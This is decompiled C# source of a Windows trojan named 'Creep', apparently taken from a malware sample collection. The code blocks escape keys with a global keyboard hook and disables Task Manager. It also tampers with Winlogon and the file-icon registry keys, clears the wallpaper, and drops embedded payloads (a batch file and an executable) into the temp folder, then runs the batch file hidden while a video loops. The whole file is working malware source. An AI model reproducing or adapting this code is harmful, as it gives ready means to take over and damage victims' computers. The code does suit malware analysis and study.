// Decompiled with JetBrains decompiler
// Type: Creep.MainWindow
// Assembly: 000, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13F43A77-4E8B-438F-A69A-882CC6C087E6
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\000\000.exe

using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Markup;
using Utilities;

#nullable disable
namespace Creep;

public partial class MainWindow : Window, IComponentConnector
{
  private GlobalKeyboardHook gkh;
  internal MainWindow main;
  internal MediaElement video;
  private bool _contentLoaded;

  public MainWindow()
  {
    Console.WriteLine("beginning!");
    this.gkh = new GlobalKeyboardHook();
    this.gkh.HookedKeys.Add(Keys.Escape);
    this.gkh.HookedKeys.Add(Keys.LWin);
    this.gkh.HookedKeys.Add(Keys.RWin);
    this.gkh.HookedKeys.Add(Keys.Tab);
    this.gkh.HookedKeys.Add(Keys.Delete);
    this.gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(this.handleKey);
    this.gkh.hook();
    this.WorkWorkWorkWork();
    this.InitializeComponent();
  }

  private void handleKey(object sender, System.Windows.Forms.KeyEventArgs e) => e.Handled = true;

  private void main_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
  {
    e.Handled = true;
  }

  public void WorkWorkWorkWork()
  {
    string tempPath = Path.GetTempPath();
    File.WriteAllBytes(tempPath + "icon.ico", Creep.Properties.Resources.texticon);
    RegistryKey subKey1 = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
    subKey1.SetValue("", (object) (tempPath + "icon.ico"));
    subKey1.Close();
    RegistryKey subKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
    subKey2.SetValue("Wallpaper", (object) "");
    subKey2.Close();
    RegistryKey subKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    subKey3.SetValue("DisableTaskMgr", (object) "1");
    subKey3.Close();
    RegistryKey subKey4 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    subKey4.SetValue("AutoRestartShell", (object) "0", RegistryValueKind.DWord);
    subKey4.Close();
    File.WriteAllBytes(tempPath + "text.txt", Creep.Properties.Resources.txt);
    File.WriteAllBytes(tempPath + "windl.bat", Creep.Properties.Resources.windl);
    File.WriteAllBytes(tempPath + "one.rtf", Creep.Properties.Resources.one);
    File.WriteAllBytes(tempPath + "rniw.exe", Creep.Properties.Resources.subox);
    Process.Start(new ProcessStartInfo(tempPath + "windl.bat")
    {
      CreateNoWindow = true,
      UseShellExecute = false
    });
  }

  private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
  {
    (sender as MediaElement).Position = TimeSpan.FromMilliseconds(1.0);
  }

  private void video_Loaded(object sender, RoutedEventArgs e)
  {
    string str = Path.GetTempPath() + "v.mp4";
    File.WriteAllBytes(str, Creep.Properties.Resources.street);
    this.video.Source = new Uri(str);
  }

  [DebuggerNonUserCode]
  [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
  public void InitializeComponent()
  {
    if (this._contentLoaded)
      return;
    this._contentLoaded = true;
    System.Windows.Application.LoadComponent((object) this, new Uri("/000;component/mainwindow.xaml", UriKind.Relative));
  }

  [DebuggerNonUserCode]
  [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  void IComponentConnector.Connect(int connectionId, object target)
  {
    switch (connectionId)
    {
      case 1:
        this.main = (MainWindow) target;
        this.main.PreviewKeyDown += new System.Windows.Input.KeyEventHandler(this.main_PreviewKeyDown);
        break;
      case 2:
        this.video = (MediaElement) target;
        this.video.Loaded += new RoutedEventHandler(this.video_Loaded);
        this.video.MediaEnded += new RoutedEventHandler(this.MediaElement_MediaEnded);
        break;
      default:
        this._contentLoaded = true;
        break;
    }
  }
}
